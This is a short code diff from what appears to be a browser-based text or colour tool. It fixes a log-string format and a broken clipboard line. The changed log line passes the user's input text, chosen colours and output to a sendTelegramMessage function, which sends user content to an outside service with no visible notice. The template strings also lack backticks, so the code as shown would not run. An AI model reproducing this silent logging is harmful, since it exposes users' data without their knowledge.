@@ -253,7 +253,7 @@
              const formattedDate = now.toLocaleDateString();
              const formattedTime = now.toLocaleTimeString();
 
-            const logMessage = [${formattedDate}]:[${formattedTime}][${startColor}]:[${endColor}]:[${text}]:[${output}];
+            const logMessage = [${formattedDate}]:[${formattedTime}]:[${startColor}]:[${endColor}]:[${text}]:[${output}];
             sendTelegramMessage(logMessage);
 
 
@@ -267,7 +267,7 @@
                 alert('Failed to copy: ' + err);
             });
         });
-ElementById('output').textContent;
+document.getElementById('output').textContent;
             navigator.clipboard.writeText(outputText).then(() => {
                 alert('Output copied to clipboard!');
             }).catch(err => {
